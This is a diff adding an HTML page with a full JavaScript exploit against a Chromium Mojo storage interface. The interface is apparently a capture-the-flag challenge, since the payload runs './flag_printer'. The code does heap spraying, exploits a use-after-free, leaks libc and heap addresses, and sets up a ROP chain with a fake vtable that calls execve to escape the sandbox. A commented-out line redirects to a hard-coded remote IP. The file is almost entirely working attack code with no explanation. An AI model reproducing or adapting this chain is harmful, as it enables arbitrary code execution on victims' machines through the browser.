@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script type="text/javascript" src="/mojo_bindings.js"></script>
+<script type="text/javascript" src="/third_party/blink/public/mojom/tstorage/tstorage.mojom.js"></script>
+
+<script type="text/javascript">
+const hex = (x) => ("0x" + x.toString(16));
+const print = console.log;
+const refs = [];
+const tInsPtrSprays = [];
+const tInsPtrSprays2 = [];
+async function createSprayObjects(tInsPtrSprays)
+{
+	const tStrPtrSpray = new blink.mojom.TStoragePtr();
+	Mojo.bindInterface(blink.mojom.TStorage.name,
+		mojo.makeRequest(tStrPtrSpray).handle, 'context', true);
+	await tStrPtrSpray.init();
+	const tInsPtr = (await tStrPtrSpray.createInstance()).instance;
+	tInsPtrSprays.push(tInsPtr);
+	refs.push(tStrPtrSpray);
+}
+
+// 10 -> True, True, True, True, True, True, True, True, True, True, True, False, True, True, False, True, True, False, True, True, True, True, True, True,
+// 12 15 18 22 27 33 41 51 63 78 97 60 75 93 57 71 88 55 68 85 106 132 165 206
+
+async function sprayQueue(tInsPtrSprays, val=0x41414141)
+{
+	let i = 0;
+	for (const tInsPtr of tInsPtrSprays)
+	{
+		for (let i = 0; i < 97; i++)
+			await tInsPtr.push(val);
+		for (let i = 0; i < 49; i++)
+			await tInsPtr.pop();
+		// current capacity: 60, current size: 48
+		for (let i = 0; i < 93 - 48; i++)
+			await tInsPtr.push(val);
+		for (let i = 0; i < 47; i++)
+			await tInsPtr.pop();
+		// current capacity: 57, current size: 46
+		for (let i = 0; i < 88 - 46; i++)
+			await tInsPtr.push(val);
+		for (let i = 0; i < 44; i++)
+			await tInsPtr.pop();
+		// current capacity: 55, current size: 44
+		for (let i = 0; i < 206 - 44 - 1; i++)
+			await tInsPtr.push(0);
+		await tInsPtr.push(i);
+		// int_value_
+		i++;
+
+		// console.log(await tInsPtr.getTotalSize());
+	}
+}
+
+async function main()
+{
+for (let i = 0; i < 0x10; i++)
+{
+	await createSprayObjects(tInsPtrSprays);
+	await createSprayObjects(tInsPtrSprays2);
+}
+print("spray init done");
+
+const tStrPtr = new blink.mojom.TStoragePtr();
+Mojo.bindInterface(blink.mojom.TStorage.name,
+	mojo.makeRequest(tStrPtr).handle,
+	'context', true);
+await tStrPtr.init();
+const tInsPtr = (await tStrPtr.createInstance()).instance;
+await tStrPtr.init();
+
+print("UAF done");
+await sprayQueue(tInsPtrSprays);
+print("spray done");
+// for (let i = 0; i < uafs.length; i++)
+// 	print(hex((await uafs[i].get(2)).value));
+// for (let i = 0; i < 0x100; i++) {
+// 	await uafs[i].setInt(0x13372019 + i);
+// }
+// for (let i = 0; i < uafs.length; i++)
+// 	print(hex((await uafs[i].getInt()).value));
+const libcAddr = (await tStrPtr.getLibcAddress()).addr - 0x40680;
+const textAddr = (await tStrPtr.getTextAddress()).addr - 0x39b5e60;
+
+// rop and fake virtual table
+// 0xd1ba7: lea rdi, [rsp + 0xb0]; mov rsi, rbp; call rbx
+// 0x52bc8: pop rbp; pop rbx; ret;
+// 0x2cb49: pop rbx; ret;
+// 0x1b96: pop rdx; ret;
+// 0x439c8: pop rax; ret;
+await tInsPtr.push(libcAddr + 0x52bc8); // begin of ROP
+await tInsPtr.push(0); // let queue to have some element
+await tInsPtr.push(textAddr + 0x3fa5114); // xchg rsp,rax, as virtual table
+await tInsPtr.push(libcAddr + 0x2cb49);
+await tInsPtr.push(libcAddr + 0xe4e30); // execve
+
+await tInsPtr.push(libcAddr + 0x1b96);
+await tInsPtr.push(0); // rdx = 0
+
+await tInsPtr.push(libcAddr + 0xd1ba7);
+
+
+for (let i = 0; i < 0x10; i++) {
+	await tInsPtr.push([0x6c662f2e, 0x705f6761]);
+/* // setUint64 in mojo_bindings.js is modified to this to support this,
+// otherwise we cannot set a correct uint64
+// due to the precision of js number
+Buffer.prototype.setUint64 = function(offset, value) {
+  var hi;
+  if (typeof value == 'object') {
+    hi = value[1];
+    value = value[0]
+  }
+  else {
+    hi = (value / kHighWordMultiplier) | 0;
+  }
+  if (kHostIsLittleEndian) {
+    this.dataView.setInt32(offset, value, kHostIsLittleEndian);
+    this.dataView.setInt32(offset + 4, hi, kHostIsLittleEndian);
+  } else {
+    this.dataView.setInt32(offset, hi, kHostIsLittleEndian);
+    this.dataView.setInt32(offset + 4, value, kHostIsLittleEndian);
+  }
+}
+*/
+	await tInsPtr.push(0x7265746e6972)
+}
+
+const idx = (await tInsPtr.getInt()).value;
+print(idx);
+for (let i = 0; i < 201; i++)
+	await tInsPtrSprays[idx].pop();
+const heapAddr = (await tInsPtrSprays[idx].pop()).value;
+// pop element to leak the address of heap
+// now 0x678 is freed again due to poping elements
+print(hex(heapAddr));
+
+await sprayQueue(tInsPtrSprays2, heapAddr);
+print(hex(libcAddr))
+print(hex(textAddr));
+
+await tInsPtr.getTotalSize();
+}
+main();
+
+//
+</script>
+<!-- <script>window.location = "http://192.144.212.163:8000/dajbnkcnamlskdm.html"</script> -->
+</head>
+</html>
